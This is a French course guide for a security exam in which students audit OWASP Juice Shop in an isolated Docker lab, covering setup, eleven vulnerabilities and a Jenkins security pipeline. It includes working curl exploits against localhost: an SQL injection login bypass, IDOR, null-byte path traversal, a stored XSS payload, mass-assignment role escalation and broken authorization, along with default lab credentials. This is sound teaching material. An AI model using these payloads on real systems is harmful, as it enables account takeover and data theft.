# GUIDE COMPLET — Examen Final Sécurité des Données

**Cours :** Sécurité des données — Licence 3 Cybersécurité — UNCHK  
**Application cible :** OWASP Juice Shop (Node.js / Express / SQLite3)  
**Environnement :** Docker isolé — réseau 172.20.0.0/24

> Ce guide est la référence complète du projet d'examen. Il couvre l'installation, chaque vulnérabilité, les exploits, le pipeline Jenkins, les remédiations, l'interprétation des résultats et le script de démonstration vidéo.

---

## Table des matières

1. [Vue d'ensemble du projet](#1-vue-densemble-du-projet)
2. [Prérequis et installation](#2-prérequis-et-installation)
3. [Architecture détaillée](#3-architecture-détaillée)
4. [Lancement de l'environnement pas-à-pas](#4-lancement-de-lenvironnement-pas-à-pas)
5. [Guide des vulnérabilités](#5-guide-des-vulnérabilités)
   - 5.1 V1 — En-têtes HTTP manquants (CWE-16)
   - 5.2 V2 — SQL Injection (CWE-89)
   - 5.3 V3 — IDOR — Paniers (CWE-639)
   - 5.4 V4 — Path Traversal + Null Byte (CWE-22/626)
   - 5.5 V5 — XSS Stocké (CWE-79)
   - 5.6 V6 — Sensitive Data Exposure (CWE-200)
   - 5.7 V7 — Mass Assignment (CWE-915)
   - 5.8 V8 — Méthodes HTTP dangereuses (CWE-16)
   - 5.9 V9 — Absence de rate limiting (CWE-307)
   - 5.10 V10 — JWT Algorithm None Bypass (CWE-347)
   - 5.11 V11 — Broken Function Level Authorization (CWE-284)
6. [Guide du pipeline Jenkins](#6-guide-du-pipeline-jenkins)
7. [Guide des outils de sécurité](#7-guide-des-outils-de-sécurité)
   - 7.5 HDWP (DAST sémantique)
8. [Interprétation des résultats](#8-interprétation-des-résultats)
9. [Guide de remédiation](#9-guide-de-remédiation)
10. [Décision de déploiement](#10-décision-de-déploiement)
11. [Script de démonstration vidéo](#11-script-de-démonstration-vidéo)
12. [Troubleshooting](#12-troubleshooting)
13. [Référence rapide — commandes essentielles](#13-référence-rapide--commandes-essentielles)

---

## 1. Vue d'ensemble du projet

### Ce que nous faisons

Ce projet simule un audit de sécurité complet avant une mise en production. L'application à évaluer est **OWASP Juice Shop**, une boutique en ligne volontairement vulnérable construite avec Node.js / Express / Angular. Elle contient délibérément toutes les vulnérabilités du **OWASP Top 10 2021**, ce qui en fait l'outil de formation standard en cybersécurité applicative.

### Rôle joué

**Cybersecurity Analyst / Junior DevSecOps Engineer** — notre mission est de :
1. Trouver et documenter les vulnérabilités
2. Exploiter les plus critiques pour prouver leur impact réel
3. Proposer des corrections concrètes
4. Automatiser les vérifications dans un pipeline CI/CD Jenkins
5. Décider si l'application peut être déployée en production

### Résultat attendu

À la fin de ce guide, tu auras :
- Identifié et exploité 11 vulnérabilités confirmées
- Un pipeline Jenkins fonctionnel avec 4 types d'analyse automatisée
- Un scan HDWP avec 91 findings (JWT alg_none, BFLA multi-endpoints, headers manquants)
- Des remédiations implémentées pour les 3 vulnérabilités les plus critiques
- Un rapport PDF complet (10 sections)
- Une décision de déploiement argumentée : **Reject Deployment**

---

## 2. Prérequis et installation

### 2.1 Logiciels requis

| Logiciel | Version minimale | Rôle |
|----------|-----------------|------|
| Docker Desktop | 24.0+ | Conteneurisation de l'environnement |
| Docker Compose v2 | 2.0+ | Orchestration des conteneurs |
| Node.js | 18+ | Vérification syntaxe des fichiers JS |
| `curl` | Toute version | Tests HTTP manuels |
| Navigateur web | Chrome / Firefox | Interface Juice Shop, Jenkins, MailHog |

### 2.2 Vérification que tout est installé

```bash
docker --version            # Docker version 24.x.x
docker compose version      # Docker Compose version v2.x.x
node --version              # v18.x.x ou supérieur
curl --version              # curl 7.x.x ou 8.x.x
```

### 2.3 Structure des dossiers du projet

Deux répertoires importants coexistent :

```
cours_simac_l3/Semestre_6/Sec_data/
│
├── projet/labs_v2/lab1-jenkins/    ← Environnement Docker + scripts de test
│   ├── docker-compose.yml          ← Définit juiceshop + jenkins + mailhog
│   ├── Jenkinsfile                 ← Pipeline Jenkins des labs
│   └── scripts/                   ← test_http.sh ... test_exploitation.sh
│
└── examen/projet_examen/           ← LIVRABLE D'EXAMEN (ce dossier)
    ├── GUIDE.md                    ← Ce fichier
    ├── README.md                   ← Vue d'ensemble rapide
    ├── Jenkinsfile                 ← Pipeline examen (6 étapes)
    ├── reports/                    ← Rapport final (MD + HTML)
    ├── screenshots/                ← 10 captures d'écran
    ├── security-config/            ← Configs de sécurité (helmet, nginx)
    └── remediation/                ← Code de correction (JS + notes)
```

---

## 3. Architecture détaillée

### 3.1 Réseau Docker

```
Machine Linux (hôte)
│
│ docker network: lab1-jenkins_default (172.20.0.0/24)
│
├── juiceshop   172.20.0.10  port 3000  ← Application cible (Node.js)
├── jenkins     172.20.0.20  port 8080  ← Orchestrateur CI/CD
└── mailhog     172.20.0.30  port 1025  ← Serveur SMTP local (capture emails)
                             port 8025  ← Interface web MailHog
```

### 3.2 OWASP Juice Shop

- **Image Docker :** `bkimminich/juice-shop:latest`
- **Stack :** Node.js 18 / Express 4 / Angular 16 / SQLite3
- **Authentification :** JWT RS256 (clé privée RSA dans le conteneur)
- **Base de données :** SQLite3 (fichier local dans le conteneur)
- **Identifiants admin :** `admin@juice-sh.op` / `admin123`

Juice Shop est une **Single Page Application (SPA)** Angular. Cela signifie que toutes les routes inconnues retournent HTTP 200 avec le fichier `index.html` — le routage se fait côté client. C'est pourquoi TEST 01 détecte une anomalie sur les pages inexistantes (HTTP 200 au lieu de 404 attendu).

### 3.3 Jenkins

- **Image Docker :** `jenkins/jenkins:lts`
- **Port :** 8080
- **Identifiants :** `admin` / `admin123`
- **Scripts montés :** Volume bind-mount de `./scripts:/lab/scripts` (lecture seule)
- **Pipeline :** Pipeline from SCM — lit le `Jenkinsfile` depuis GitHub à chaque build

### 3.4 MailHog

- **Image Docker :** `mailhog/mailhog:latest`
- **SMTP :** port 1025 (Jenkins envoie les emails ici)
- **Interface web :** http://localhost:8025 (consulter les emails reçus)
- **Comportement :** Capture tous les emails envoyés par Jenkins, ne les transmet jamais à une vraie boîte mail

---

## 4. Lancement de l'environnement pas-à-pas

### 4.1 Démarrer les conteneurs

```bash
# Aller dans le répertoire du lab1
cd /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins

# Démarrer tous les conteneurs en arrière-plan
DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock" \
docker compose up -d

# Vérifier que les trois conteneurs sont démarrés
DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock" \
docker compose ps
```

**Résultat attendu :**
```
NAME        STATUS              PORTS
juiceshop   Up (healthy)        0.0.0.0:3000->3000/tcp
jenkins     Up                  0.0.0.0:8080->8080/tcp
mailhog     Up                  0.0.0.0:1025->1025/tcp, 0.0.0.0:8025->8025/tcp
```

> **Attention :** MailHog peut échouer si le port 1025 est déjà utilisé par un autre conteneur. Dans ce cas, `juiceshop` et `jenkins` fonctionnent quand même. Le pipeline notifie via MailHog mais ne bloque pas si MailHog est absent.

### 4.2 Vérifier que Juice Shop est prêt

```bash
# Juice Shop prend ~15-30 secondes pour démarrer
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://localhost:3000/
# Attendu : HTTP 200
```

### 4.3 Vérifier que Jenkins est prêt

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://localhost:8080/login
# Attendu : HTTP 200
```

Ouvrir http://localhost:8080 dans le navigateur et se connecter avec `admin` / `admin123`.

### 4.4 Arrêter l'environnement

```bash
cd /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins
DOCKER_HOST="unix:///home/virus-one/.docker/desktop/docker.sock" \
docker compose down
```

---

## 5. Guide des vulnérabilités

Pour chaque vulnérabilité : **ce qu'elle est**, **pourquoi elle existe**, **comment la détecter**, **comment l'exploiter**, **son impact réel**.

### 5.1 V1 — En-têtes HTTP de sécurité manquants (CWE-16)

**OWASP :** A05:2021 — Security Misconfiguration | **CVSS :** 5.3 (Medium)

#### Qu'est-ce que c'est ?

Les en-têtes HTTP de sécurité sont des directives que le serveur envoie au navigateur pour lui indiquer comment se comporter. Leur absence laisse le navigateur prendre des décisions par défaut, souvent peu sûres.

| En-tête | Rôle | Impact de l'absence |
|---------|------|---------------------|
| `Strict-Transport-Security` (HSTS) | Force HTTPS | Permet des connexions HTTP en clair → risque MITM |
| `Content-Security-Policy` (CSP) | Définit les sources de contenu autorisées | Facilite les attaques XSS (le navigateur exécute tout) |
| `Referrer-Policy` | Contrôle les infos de référence envoyées | Fuite d'URL interne dans les requêtes vers des tiers |

#### Détection

```bash
# Script automatisé
JUICE_SHOP_URL=http://localhost:3000 REPORT_DIR=/tmp/test \
bash /home/virus-one/cours_simac_l3/Semestre_6/Sec_data/projet/labs_v2/lab1-jenkins/scripts/test_headers.sh

# Manuellement avec curl
curl -sI http://localhost:3000/ | grep -iE "strict-transport|content-security|referrer-policy"
# Résultat attendu : aucune ligne — les 3 headers sont ABSENTS
```

#### Résultat observé

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *      ← CORS wildcard — risque
X-Content-Type-Options: nosniff     ← Présent (bien)
X-Frame-Options: SAMEORIGIN         ← Présent (bien, mais DENY serait mieux)
Feature-Policy: payment 'self'

[MANQUANT] Strict-Transport-Security
[MANQUANT] Content-Security-Policy
[MANQUANT] Referrer-Policy
```

---

### 5.2 V2 — SQL Injection — Authentification (CWE-89)

**OWASP :** A03:2021 — Injection | **CVSS :** 9.8 (Critical)

#### Qu'est-ce que c'est ?

Une injection SQL se produit quand des données fournies par l'utilisateur sont insérées directement dans une requête SQL sans être nettoyées. L'attaquant peut modifier la logique de la requête pour contourner l'authentification, lire des données, les modifier ou les supprimer.

#### Pourquoi Juice Shop est vulnérable ?

Dans le code source de Juice Shop (`routes/login.ts`), la requête de login ressemble à :
```javascript
// Code vulnérable simplifié
db.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)
```

La valeur de `email` est insérée directement dans la chaîne SQL via un template literal.

#### Le payload d'attaque

```
email: ' OR '1'='1'--
```

Ce que ça fait à la requête SQL :
```sql
-- Requête normale :
SELECT * FROM Users WHERE email = 'victim@example.com' AND deletedAt IS NULL

-- Requête avec injection :
SELECT * FROM Users WHERE email = '' OR '1'='1'-- ' AND deletedAt IS NULL
--                                   ^^^^^^^^^^^  ^^
--                               condition vraie   commentaire SQL = efface le reste
```

La condition `'1'='1'` est **toujours vraie**, donc la requête retourne le premier utilisateur de la base — qui est l'administrateur.

#### Détection

```bash
# Script automatisé (detecte la SQLi)
JUICE_SHOP_URL=http://localhost:3000 REPORT_DIR=/tmp/test \
bash scripts/test_auth.sh
# Attendu : [CRITICAL] SQLi réussie — JWT retourné sans credentials valides
```

#### Exploitation (EXP-01)

```bash
# Exploitation directe avec curl
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}' \
  http://localhost:3000/rest/user/login

# Résultat : HTTP 200 + réponse JSON contenant le JWT admin
# {"authentication":{"token":"eyJ0eXAiOiJKV1Qi...","bid":1,"umail":"admin@juice-sh.op"}}
```

**JWT décodé (partie payload, base64) :**
```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin",
    "password": "0192023a7bbd73250516f069df18b500"
  },
  "bid": 1
}
```

`0192023a7bbd73250516f069df18b500` est le hash MD5 de `admin123` — le mot de passe admin est exposé dans chaque token JWT.

#### Impact réel

Avec ce JWT, l'attaquant peut :
- Accéder à tous les endpoints administrateur
- Lire la liste complète des utilisateurs (`GET /api/Users`)
- Modifier n'importe quelle ressource
- Accéder à la configuration interne de l'application

---

### 5.3 V3 — IDOR — Accès non autorisé aux paniers (CWE-639)

**OWASP :** A01:2021 — Broken Access Control | **CVSS :** 8.1 (High)

#### Qu'est-ce que c'est ?

IDOR (Insecure Direct Object Reference) est une vulnérabilité de contrôle d'accès. L'application utilise un identifiant prévisible (ici l'ID numérique du panier) pour accéder à une ressource, mais ne vérifie pas si l'utilisateur qui fait la requête est bien le propriétaire de cette ressource.

#### Pourquoi Juice Shop est vulnérable ?

Le middleware d'authentification de Juice Shop vérifie que le JWT est **valide** (signature correcte, non expiré) mais ne vérifie pas que l'utilisateur est **propriétaire** du panier demandé.

```javascript
// Ce que Juice Shop fait (simplifié)
router.get('/basket/:id', security.isAuthorized, async (req, res) => {
  // security.isAuthorized vérifie : JWT présent et valide → OK
  // MAIS ne vérifie PAS : req.user.basketId === req.params.id
  const basket = await Basket.findByPk(req.params.id)
  res.json(basket)
})
```

#### Exploitation (EXP-02)

```bash
# Étape 1 : Créer un compte attaquant
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"P@ssword1!","passwordRepeat":"P@ssword1!","securityQuestion":{"id":1,"question":"q"},"securityAnswer":"a"}' \
  http://localhost:3000/api/Users

# Étape 2 : Obtenir un JWT attaquant
JWT_ATT=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"P@ssword1!"}' \
  http://localhost:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "JWT attaquant : ${JWT_ATT:0:50}..."

# Étape 3 : Accéder au panier de la victime (ID=1 = panier de l'admin)
curl -s -H "Authorization: Bearer $JWT_ATT" \
  http://localhost:3000/rest/basket/1
# Résultat : HTTP 200 + contenu du panier d'un autre utilisateur
```

#### Impact réel

Un attaquant peut :
- Lire le contenu du panier de n'importe quel utilisateur (données personnelles d'achat)
- Ajouter des articles dans le panier d'une victime à son insu
- Supprimer des articles du panier d'une victime

---

### 5.4 V4 — Path Traversal + Null Byte Bypass (CWE-22/CWE-626)

**OWASP :** A01:2021 — Broken Access Control | **CVSS :** 7.5 (High)

#### Qu'est-ce que c'est ?

**Path Traversal :** L'application expose un répertoire `/ftp/` accessible sans authentification, permettant de télécharger des fichiers internes sensibles.

**Null Byte Bypass :** Un filtre d'extension bloque les fichiers `.bak` (fichiers de sauvegarde). L'attaquant contourne ce filtre en ajoutant un null byte encodé double dans l'URL, trompant le parseur de chemins.

#### Technique du null byte

Le filtre vérifie l'extension en cherchant `.bak` dans l'URL. En ajoutant `%2500` après `.bak` :

```
URL demandée : /ftp/package.json.bak%2500.md
               ↓
Décodage 1 (serveur HTTP) : /ftp/package.json.bak%00.md
               ↓
Décodage 2 (application) : /ftp/package.json.bak\0.md
               ↓
Filtre voit  : .md → autorisé
Système voit : /ftp/package.json.bak (null byte coupe le nom)
```

#### Exploitation (EXP-03)

```bash
# Fichiers accessibles directement (sans filtrage)
curl -s http://localhost:3000/ftp/acquisitions.md
# Retourne : document interne sur les acquisitions de l'entreprise

curl -s http://localhost:3000/ftp/legal.md
# Retourne : document juridique interne

# Fichier bloqué normalement
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/ftp/package.json.bak
# Retourne : 403 (bloqué par le filtre .bak)

# Contournement du filtre via null byte
curl -s --path-as-is http://localhost:3000/ftp/package.json.bak%2500.md | head -20
# Retourne : HTTP 200 + contenu de package.json.bak (dépendances + versions)
```

#### Impact réel

- Accès à des documents confidentiels internes (fusions, acquisitions, documents légaux)
- Accès à `package.json.bak` révèle les versions exactes de toutes les dépendances → facilite les attaques ciblées sur les CVE connues

---

### 5.5 V5 — XSS Stocké — Feedbacks (CWE-79)

**OWASP :** A03:2021 — Injection | **CVSS :** 7.2 (High)

#### Qu'est-ce que c'est ?

Cross-Site Scripting (XSS) stocké : l'application accepte du contenu HTML/JavaScript dans un champ de formulaire et le stocke en base de données sans le nettoyer. Quand la page des feedbacks est affichée, le script malveillant s'exécute dans le navigateur de chaque visiteur.

#### Différence XSS réfléchi vs stocké

- **XSS réfléchi :** le payload est dans l'URL → n'affecte que la victime qui clique sur le lien piégé
- **XSS stocké :** le payload est en base de données → affecte tous les utilisateurs qui consultent la page (plus dangereux)

#### Exploitation (EXP-04)

```bash
# Injecter un payload XSS dans les feedbacks
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"comment":"Feedback légitime <iframe src=\"javascript:alert(`XSS-DEMO`)\"></iframe>","rating":1,"captchaId":0,"captcha":""}' \
  http://localhost:3000/api/Feedbacks

# Vérifier que le payload est persisté
curl -s http://localhost:3000/api/Feedbacks | \
  python3 -c "import sys,json; data=json.load(sys.stdin)['data']; [print(f['comment'][:100]) for f in data if 'XSS' in f.get('comment','')]"
```

Pour voir l'exécution du XSS : ouvrir http://localhost:3000/#/about dans le navigateur.

#### Impact réel

Un attaquant peut injecter :
- `document.cookie` → vol de session (si les cookies ne sont pas `HttpOnly`)
- Une redirection vers un site de phishing
- Un keylogger JavaScript
- Un faux formulaire de connexion (credential harvesting)

---

### 5.6 V6 — Exposition de données sensibles (CWE-200)

**OWASP :** A02:2021 — Cryptographic Failures | **CVSS :** 7.5 (High)

#### Endpoints concernés

**`GET /rest/admin/application-configuration`** — accessible sans authentification :

```bash
curl -s http://localhost:3000/rest/admin/application-configuration | \
  python3 -m json.tool | head -30
```

Retourne la configuration complète incluant :
- L'ID client Google OAuth : `1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com`
- Les paramètres internes de l'application
- La liste des challenges et leurs métadonnées

**`GET /api/Feedbacks`** — accessible sans authentification :

```bash
curl -s http://localhost:3000/api/Feedbacks | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
print(f'{len(data)} feedbacks exposés')
for f in data[:3]:
    print(f'  UserId={f[\"UserId\"]} — {f[\"comment\"][:60]}')
"
```

---

### 5.7 V7 — Mass Assignment — Escalade de privilège (CWE-915)

**OWASP :** A08:2021 — Software and Data Integrity Failures | **CVSS :** 8.8 (Critical)

#### Qu'est-ce que c'est ?

Mass Assignment (ou "parameter pollution") : l'API accepte n'importe quel champ du body JSON et l'applique directement au modèle de données, y compris des champs sensibles comme `role` qui ne devraient jamais être modifiables par un utilisateur lambda.

#### Pourquoi Juice Shop est vulnérable ?

```javascript
// Code vulnérable simplifié (UserApiRouter.ts)
router.put('/:id', security.isAuthorized, async (req, res) => {
  await User.update(req.body, { where: { id: req.params.id } })
  // req.body peut contenir n'importe quel champ : role, isActive, totpSecret...
})
```

#### Exploitation (EXP-05)

```bash
# Obtenir d'abord un JWT pour un compte attaquant (voir EXP-02 pour créer le compte)
JWT_ATT=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"P@ssword1!"}' \
  http://localhost:3000/rest/user/login | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# Récupérer l'ID de l'utilisateur attaquant
USER_ID=$(curl -s -H "Authorization: Bearer $JWT_ATT" \
  http://localhost:3000/rest/user/whoami | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['user']['id'])")

echo "Utilisateur ID : $USER_ID"
echo "Rôle actuel :"
curl -s -H "Authorization: Bearer $JWT_ATT" http://localhost:3000/rest/user/whoami | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['user']['role'])"

# Escalade de privilège : modifier son propre rôle
curl -s -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_ATT" \
  -d '{"role":"admin"}' \
  http://localhost:3000/api/Users/$USER_ID

echo ""
echo "Rôle après exploitation :"
curl -s -H "Authorization: Bearer $JWT_ATT" http://localhost:3000/rest/user/whoami | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['user']['role'])"
```

---

### 5.8 V8 — Méthodes HTTP dangereuses (CWE-16)

**OWASP :** A05:2021 — Security Misconfiguration | **CVSS :** 5.8 (Medium)

#### Qu'est-ce que c'est ?

La méthode HTTP **TRACE** retourne dans sa réponse l'intégralité de la requête reçue, y compris les en-têtes HTTP (cookies, tokens). Combinée avec XSS, elle permet une attaque **Cross-Site Tracing (XST)** capable d'exfiltrer des cookies marqués `HttpOnly` que JavaScript ne peut normalement pas lire.

#### Détection

```bash
# Vérifier si TRACE est actif
curl -s -X TRACE http://localhost:3000/ -I | head -5
# Si HTTP 200 → TRACE actif → vulnérable XST

# Tester toutes les méthodes dangereuses
for method in TRACE PUT DELETE CONNECT; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/ 2>/dev/null)
  echo "$method → HTTP $CODE"
done
```

---

### 5.9 V9 — Absence de rate limiting (CWE-307)

**OWASP :** A07:2021 — Identification and Authentication Failures | **CVSS :** 7.3 (High)

#### Qu'est-ce que c'est ?

Sans limitation du nombre de tentatives de connexion, un attaquant peut tenter des milliers de mots de passe en quelques minutes (brute force) sans être bloqué.

#### Détection

```bash
# 10 tentatives rapides — aucun HTTP 429 attendu
for i in $(seq 1 10); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"wrong$i\"}" \
    http://localhost:3000/rest/user/login 2>/dev/null)
  echo "Tentative $i → HTTP $CODE"
done
# Résultat : toutes retournent HTTP 401 (jamais 429 Too Many Requests)
```

---

### 5.10 V10 — JWT Algorithm None Bypass (CWE-347)

**OWASP :** A02:2021 — Cryptographic Failures | **CVSS :** 8.2 (High)

#### Qu'est-ce que c'est ?

Le JWT (JSON Web Token) utilise un champ `alg` dans son header pour indiquer l'algorithme de signature. L'attaque "alg none" consiste à modifier ce champ à `"none"` et à supprimer la signature, forçant le serveur à accepter le token sans vérification cryptographique.

#### Pourquoi Juice Shop est vulnérable ?

La bibliothèque `jsonwebtoken` de Node.js, si mal configurée, accepte les tokens avec `alg: "none"`. Juice Shop ne force pas un algorithme spécifique lors de la vérification :

```javascript
// Code vulnérable simplifié
jwt.verify(token, publicKey)  // Accepte n'importe quel alg, y compris "none"
```

#### Découverte par HDWP

Cette vulnérabilité a été détectée automatiquement par HDWP lors du scan du 11/09/2026 :

- **Plugin :** `core.session_property.jwt`
- **Mutation :** `jwt_manipulation` (type `alg_none`)
- **Méthode :** HDWP a falsifié l'hypothèse "le serveur rejette les tokens avec alg=none" en envoyant un token manipulé et en observant un HTTP 200 au lieu du 401 attendu
- **Confiance :** 95% (reproductibilité 1.00, force oracle 0.95)
- **Expériences :** EXP-4a7bd886, EXP-4d948905, EXP-83c9e2a2

#### Impact réel

Un attaquant peut :
- Forger un JWT avec `role: "admin"` sans connaître la clé RSA privée
- Accéder à tous les endpoints protégés avec des privilèges arbitraires
- Cela constitue un deuxième vecteur d'accès admin, indépendant de la SQLi (V2)

---

### 5.11 V11 — Broken Function Level Authorization — 5 endpoints (CWE-284)

**OWASP :** A01:2021 — Broken Access Control | **CVSS :** 7.6 (High)

#### Qu'est-ce que c'est ?

BFLA (Broken Function Level Authorization) se produit quand des endpoints réservés à un rôle (ex: admin) sont accessibles par un autre rôle (ex: customer). Contrairement à IDOR (V3) qui concerne l'accès à des *objets* d'autres utilisateurs, BFLA concerne l'accès à des *fonctions* réservées.

#### Découverte par HDWP

HDWP a détecté cette vulnérabilité via une analyse cross-role automatique :

- **Plugin :** `core.authorization.authz`
- **Mutation :** `privilege_escalation`
- **Méthode :** HDWP envoie la même requête avec le JWT `customer` et le JWT `admin`, puis compare les réponses. Si les deux rôles obtiennent HTTP 200, l'endpoint a un contrôle d'accès insuffisant.
- **Confiance :** 93% par endpoint

#### Endpoints affectés

```bash
# Tous accessibles avec un JWT "customer" alors qu'ils devraient être réservés aux admins :

# Plaintes des utilisateurs
curl -s -H "Authorization: Bearer $JWT_CUSTOMER" http://localhost:3000/api/Complaints
# → HTTP 200 (devrait être 403)

# Solde du portefeuille
curl -s -H "Authorization: Bearer $JWT_CUSTOMER" http://localhost:3000/rest/wallet/balance
# → HTTP 200

# Articles des paniers (tous les utilisateurs)
curl -s -H "Authorization: Bearer $JWT_CUSTOMER" http://localhost:3000/api/BasketItems
# → HTTP 200

# Cartes de paiement enregistrées
curl -s -H "Authorization: Bearer $JWT_CUSTOMER" http://localhost:3000/api/Cards
# → HTTP 200

# CAPTCHA (endpoint interne)
curl -s -H "Authorization: Bearer $JWT_CUSTOMER" http://localhost:3000/rest/image-captcha/
# → HTTP 200
```

#### Impact réel

Un utilisateur standard peut :
- Lire les plaintes de tous les utilisateurs (données personnelles)
- Consulter les soldes de portefeuille d'autres utilisateurs
- Accéder aux cartes de paiement enregistrées

---

## 6. Guide du pipeline Jenkins

### 6.1 Configuration du job Jenkins

#### Depuis l'interface Jenkins (http://localhost:8080)

1. Se connecter avec `admin` / `admin123`
2. **Nouveau Item** → entrer un nom (ex : `examen-securite`) → **Pipeline** → **OK**
3. Dans la configuration :
   - **Build Triggers :** cocher "GitHub hook trigger for GITScm polling" + "Poll SCM" avec `H/5 * * * *`
   - **Pipeline :**
     - Definition : **Pipeline script from SCM**
     - SCM : **Git**
     - Repository URL : `https://github.com/devmail0561-web/DevSecOps_lab.git`
     - Branch : `*/main`
     - Script Path : `Jenkinsfile`
4. **Save**
5. **Webhook GitHub (déclenchement automatique au push) :**
   - Installer **ngrok** : `snap install ngrok`
   - Lancer le tunnel : `ngrok http 8080`
   - Copier l'URL HTTPS (ex : `https://xxxx.ngrok-free.dev`)
   - Sur GitHub → Settings → Webhooks → Add webhook :
     - Payload URL : `https://xxxx.ngrok-free.dev/github-webhook/`
     - Content type : `application/json`
     - Event : `Just the push event`
   - Vérifier : GitHub envoie un ping → Jenkins doit repondre HTTP 200

#### Déclenchement manuel d'un build

1. Aller sur le job Jenkins
2. Cliquer sur **"Build Now"** dans le menu gauche
3. Cliquer sur le build en cours (#1, #2...) dans "Build History"
4. Cliquer sur **"Console Output"** pour voir le log en temps réel

### 6.2 Les 6 étapes du pipeline expliquées

#### Étape 1 — Checkout

Que fait-elle :
- Affiche les informations de traçabilité du build (numéro, date, commit, branche)
- Si configuré "Pipeline from SCM", Jenkins clone le dépôt GitHub et récupère le `Jenkinsfile`

Ce qu'on voit dans les logs :
```
====================================================================
 Examen Final — Pipeline de Sécurité OWASP Juice Shop
 Build  : #3
 Date   : Wed Sep 10 11:30:00 UTC 2026
 Commit : 9190f06abc...
 Branche: origin/main
====================================================================
```

#### Étape 2 — Build / Preparation

Que fait-elle :
- Crée le répertoire temporaire `/tmp/reports_<N>/` pour stocker les résultats
- Attend que Juice Shop soit disponible (boucle de 12 tentatives × 5 secondes = max 60 secondes)
- Si Juice Shop ne répond pas après 60 secondes → erreur bloquante (le pipeline s'arrête)

Pourquoi c'est important :
- Les tests suivants ne peuvent pas s'exécuter si l'application n'est pas démarrée
- La boucle d'attente évite les faux échecs dus à un démarrage lent

#### Étape 3 — Security Analysis (SAST + SCA) — exécution parallèle

**SAST avec Semgrep :**
```bash
semgrep --config=p/owasp-top-ten --json --output /tmp/reports_N/semgrep_results.json /lab/app
```

Semgrep analyse le code source JavaScript/TypeScript de Juice Shop en cherchant des patterns correspondant aux règles OWASP. Si Semgrep n'est pas installé dans le conteneur Jenkins, le pipeline continue avec un fichier JSON vide (catchError = UNSTABLE, pas FAILURE).

**SCA avec npm audit :**
```bash
cd /lab/app && npm audit --json > /tmp/reports_N/npm_audit.json
```

npm audit interroge la base de données des vulnérabilités npm pour chaque dépendance listée dans `package.json` et `package-lock.json`.

#### Étape 4 — Additional Security Check (DAST + Secrets) — exécution parallèle

**DAST avec OWASP ZAP :**
Si ZAP est disponible via le script `zap_scan.sh`, il lance un spider (découverte automatique des pages) puis un scan actif (envoi de payloads sur chaque paramètre). Sinon, des tests curl manuels sont exécutés (SQLi, headers, endpoints).

**Secret Detection avec trufflehog :**
```bash
trufflehog filesystem /lab/app --json > /tmp/reports_N/secrets_scan.json
```
trufflehog analyse chaque fichier à la recherche de patterns de secrets (clés API, tokens, mots de passe) et calcule l'entropie des chaînes pour détecter les valeurs aléatoires à haute entropie (caractéristiques des tokens).

#### Étape 5 — Report Generation

Que fait-elle :
1. Exécute tous les scripts bash de test (`test_http.sh`, `test_headers.sh`, `test_methods.sh`, `test_auth.sh`, `test_api_security.sh`, `test_exploitation.sh`)
2. Consolide tous les résultats (Semgrep JSON, npm audit JSON, DAST txt, tests bash txt) dans un seul fichier `rapport_consolide.txt`
3. Copie tous les fichiers dans le workspace Jenkins
4. Archive les artefacts (accessibles depuis l'interface Jenkins)

#### Étape 6 — Notification

Que fait-elle :
- Envoie un email HTML via `emailext` au destinataire configuré
- L'email contient : numéro de build, statut coloré, durée, liens vers les logs et artefacts
- L'email est capturé par MailHog (http://localhost:8025) — pas envoyé vers une vraie boîte

### 6.3 Comprendre les statuts Jenkins

| Statut | Signification | Quand se produit-il |
|--------|--------------|---------------------|
| `SUCCESS` | Tous les stages terminés sans erreur | Aucune vulnérabilité détectée (théorique sur Juice Shop) |
| `UNSTABLE` | Stages terminés mais avec des `catchError` déclenchés | **Comportement normal** — vulnérabilités détectées |
| `FAILURE` | Un stage a échoué sans `catchError` | Juice Shop inaccessible, erreur critique du script |
| `ABORTED` | Build interrompu manuellement | — |

**Important :** Sur OWASP Juice Shop, le statut attendu est **UNSTABLE** — c'est normal et souhaité. Cela signifie "des vulnérabilités ont été détectées et documentées".

---

## 7. Guide des outils de sécurité

### 7.1 Semgrep (SAST)

**Qu'est-ce que c'est ?**
Semgrep est un outil d'analyse statique open-source qui analyse le code source en utilisant des règles exprimées dans un format YAML lisible. La règle `p/owasp-top-ten` contient des patterns pour détecter les 10 catégories de l'OWASP Top 10.

**Comment l'interpréter :**
```json
{
  "results": [
    {
      "check_id": "javascript.lang.security.audit.sqli.node-sequelize-sqli",
      "path": "routes/login.ts",
      "start": {"line": 53},
      "extra": {
        "severity": "ERROR",
        "message": "Detected potential SQL injection via string concatenation in Sequelize query"
      }
    }
  ]
}
```

- `check_id` → identifiant unique de la règle déclenchée
- `path:line` → emplacement exact dans le code source
